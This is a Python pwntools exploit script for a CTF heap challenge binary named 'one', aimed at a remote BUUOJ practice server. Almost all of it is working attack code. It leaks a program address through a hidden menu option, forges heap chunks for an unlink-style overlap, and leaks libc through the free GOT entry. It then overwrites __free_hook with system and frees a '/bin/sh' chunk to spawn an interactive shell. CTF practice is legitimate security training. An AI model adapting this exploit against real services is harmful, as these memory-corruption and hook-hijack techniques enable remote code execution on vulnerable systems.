# -*- encoding: utf-8 -*-
import sys 
import os 
import requests
from pwn import * 
binary = './one'
os.system('chmod +x %s'%binary)
context.binary = binary
context.log_level = 'debug'
elf = ELF(binary)
libc = elf.libc
# libc = ELF('')
DEBUG = 0
if DEBUG:
    libc = elf.libc
    p = process(binary)
    # p = process(['qemu-arm', binary])
    # p = process(['qemu-arm','-g','1234', binary])
    # p = process(['qemu-aarch64','-L','','-g','1234',binary])
else:
    host = 'node4.buuoj.cn'
    port = '27589'
    p = remote(host,port)

l64 = lambda            : ras(u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00')))
l32 = lambda            : ras(u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00')))
uu64= lambda a          : ras(u64(p.recv(a).ljust(8,'\x00')))
uu32= lambda a          : ras(u32(p.recv(a).ljust(4,'\x00')))
rint= lambda x = 12     : ras(int( p.recv(x) , 16))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))

def ras( data ):
    lg('leak' , data)
    return data

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def one_gadget(filename):
    log.success('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla('>',num)

def add( text = 'a'):
    cmd(1)
    sla('string:' , text)

def edit(idx , ch ,  text):
    cmd(2)
    sla('string:' , idx)
    sa('edit:' , ch)
    sla('into:' , text)

def show(idx ):
    cmd(3)
    sla('string:' , idx)

def delete(idx ):
    cmd(4)
    sla('string:' , idx)

def door(idx):
    cmd(0x3124)
    sla('(Y/N)' , 'Y')
    sla('test?' , idx)

# one_gad = one_gadget(libc.path)
# $rebase(0x0000000000203060)

# strchr 也可以适用于 \x00 , 所以每次都可以把字符串末尾修改从而增长字符串

def attack():
    
    # add( '114514' )
    door(0x80000000)
    ru('The string:\n')
    arry_addr = uu64(6)
    elf.address = arry_addr - 0x00000000002030c0
    free_got = elf.got['free']
    # dbg()
    payload = ''
    for i in range(0x20):
        payload += p8(i + 0x10)

    add( payload )
    for i in range(15):
        add('a'*0x20)

    add('/bin/sh\x00')
    add('a'*0x18 + '\x21')

    for i in range(0x18):
        edit(0 , '\x00' , p8(i + 0x50))

    edit(0 , '\x41\x00' , '\x20')
    edit(0 , '\x00' , '\x04')

    for i in range(0x18):
        edit(0 ,p8(0x67-i) + '\x00' , flat(0,0,0x30)[0x18-i-1])

    payload = flat(0 , 0x31 , arry_addr -0x18 ,  arry_addr -0x10)

    for i in range(0x20):
        edit(0 ,p8(0x2f-i) + '\x00' ,payload[0x20-i-1])

    delete(1)

    for i in range(0x18):
        edit(0 , '\x00' , 'a')

    edit(0 , '\xa8\x00' , '\xc8' )

    for i in range(6):
        edit(0 , '\x00' , p64(free_got)[i])

    show(1)
    free_addr = l64()
    libc.address = free_addr - libc.sym['free']
    system_addr = libc.sym['system']
    __free_hook = libc.sym['__free_hook']
    binsh_addr = libc.search('/bin/sh').next()
    lg('__free_hook',__free_hook)

    for i in range(6):
        edit(0 , p64(free_got)[i] + '\x00' , p64(__free_hook)[i])

    for i in range(6):
        edit(1 , '\x00' , p64(system_addr)[i])

    delete(16)
    # dbg()
    
    # p.success(getShell())
    p.interactive()

attack()

'''
@File    :   one.py
@Time    :   2022/02/10 20:32:39
@Author  :   Niyah 
'''